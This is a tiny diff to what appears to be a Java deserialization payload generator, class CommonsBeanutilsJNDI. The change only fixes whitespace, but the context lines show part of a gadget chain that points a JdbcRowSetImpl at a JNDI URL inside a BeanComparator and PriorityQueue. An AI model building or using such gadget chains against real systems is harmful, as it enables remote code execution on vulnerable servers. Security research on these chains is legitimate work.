@@ -21,7 +21,7 @@ public class CommonsBeanutilsJNDI implements ObjectPayload<Object> {
         }
 
         BeanComparator comparator = new BeanComparator("lowestSetBit");
-        JdbcRowSetImpl rs         = new JdbcRowSetImpl();
+        JdbcRowSetImpl rs = new JdbcRowSetImpl();
         rs.setDataSourceName(jndiURL);
         rs.setMatchColumn("QI4L");
         PriorityQueue queue = new PriorityQueue(2, comparator);
